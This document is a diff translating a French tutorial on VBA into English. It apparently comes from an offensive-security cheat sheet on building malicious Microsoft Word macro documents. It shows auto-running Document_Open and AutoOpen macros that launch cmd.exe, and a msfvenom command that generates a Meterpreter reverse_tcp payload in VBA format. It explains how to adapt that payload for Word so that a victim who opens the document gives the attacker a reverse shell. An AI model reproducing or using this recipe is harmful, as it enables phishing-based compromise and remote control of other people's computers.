@@ -1,16 +1,16 @@
 # Visual Basic for Application - VBA
 
-Visual Basic for Application - VBA, un langage de programmation mis en œuvre par Microsoft pour les applications telles que Microsoft Word, Excel, PowerPoint, etc... pour automatiser les tâches de presque toutes les interactions clavier et souris entre un utilisateur et les applications Microsoft Office.
+Visual Basic for Application - VBA, a programming language implemented by Microsoft for applications such as Microsoft Word, Excel, PowerPoint, etc... to automate tasks for almost all keyboard and mouse interactions between a user and Microsoft Office applications.
 
 
 ## Microsoft Word Macro
-Utilise des macros pour créer des documents Microsoft malveillants:
+Use macros to create malicious Microsoft documents:
 
-1. Créez un nouveau document Microsoft vierge pour créer notre première `macro` .
+1. Create a new blank Microsoft document to create our first `macro`.
 
-2. Modifiez maintenant le document Word et créez une fonction macro qui exécute un `cmd.exe`  ou tout fichier exécutable,  
+2. Now edit the Word document and create a macro function that executes `cmd.exe` or any executable file,
 
-3. Afin d'exécuter pour automatiquement le code VBA une fois le document ouvert, nous pouvons utiliser des fonctions intégrées telles que  `AutoOpen`  et  `Document_open` . 
+3. In order to automatically execute the VBA code once the document is opened, we can use built-in functions such as `AutoOpen` and `Document_open`.
 
 ```javascript
 Sub Document_Open()
@@ -28,22 +28,22 @@ Sub PoC()
 End Sub
 ```
 
-4. Il est important de noter que pour que la macro fonctionne, nous devons la sauvegarder au format _Macro-Enabled_ tel que` .doc` et  `docm` . 
+4. It is important to note that for the macro to work, we must save it in _Macro-Enabled_ format such as `.doc` and `docm`.
 
-5. Enregistrons maintenant le fichier en tant que modèle **`Document Word 97-2003`**
-
-
-> **Nous pouvons combiner les VBA avec des méthodes telles que les HTA et WSH. Les VBA/macros en eux-mêmes ne contournent pas intrinsèquement les détections.**
+5. Now save the file as a **`Word 97-2003 Document`** template
 
 
-Créons maintenant une charge utile pour recevoir un shell inversé.
+> **We can combine VBA with methods such as HTA and WSH. VBA/macros themselves do not intrinsically bypass detections.**
+
+
+Now let's create a payload to receive a reverse shell.
 
 ```sh
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.128 LPORT=443 -f vba
 ```
 
-NB: *Une modification doit être effectuée pour que cela fonctionne.*
+NB: *A modification must be made for this to work.*
 
-> Le résultat fonctionnera sur une feuille MS Excel. Par conséquent, remplacez  `Workbook_Open()` par  `Document_Open()` pour le rendre adapté aux documents MS Word.
+> The output will work on an MS Excel sheet. Therefore, replace `Workbook_Open()` with `Document_Open()` to make it suitable for MS Word documents.
 
-> Une fois le document MS Word malveillant ouvert sur la machine victime, nous devrions recevoir un shell inversé.
+> Once the malicious MS Word document is opened on the victim machine, we should receive a reverse shell.
